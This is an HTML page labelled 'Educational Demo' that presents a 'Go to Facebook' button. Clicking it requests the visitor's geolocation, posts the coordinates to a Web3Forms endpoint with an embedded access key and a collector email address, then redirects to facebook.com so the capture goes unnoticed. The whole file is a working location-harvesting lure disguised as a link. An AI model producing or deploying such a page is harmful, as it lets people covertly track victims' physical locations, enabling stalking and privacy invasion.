# facebook
<!DOCTYPE html>
<html>
<head>
    <title>Educational Demo</title>
    <script>
        // Function to request location (requires user permission)
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const lat = position.coords.latitude;
                        const lng = position.coords.longitude;
                        sendToServer(lat, lng); // Send data to server
                        window.location.href = "https://www.facebook.com"; // Redirect to Facebook
                    },
                    (error) => {
                        alert("Permission denied.");
                    }
                );
            } else {
                alert("Geolocation is not supported by this browser.");
            }
        }

        // Send data to Web3Forms
        async function sendToServer(lat, lng) {
            const API_KEY = "1d171cc7-68f4-4ea3-ba27-6ede0c67508e"; // Access key
            const response = await fetch("https://api.web3forms.com/submit", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    access_key: API_KEY,
                    latitude: lat,
                    longitude: lng,
                    email: "locationproject6@gmail.com" // Updated email
                })
            });
        }
    </script>
</head>
<body>
    <button onclick="getLocation()">Go to Facebook</button>
    <p style="color: red; font-size: 0.8em;">
        Note: The browser will always ask for location permission. This is for educational purposes only.
    </p>
</body>
</html>
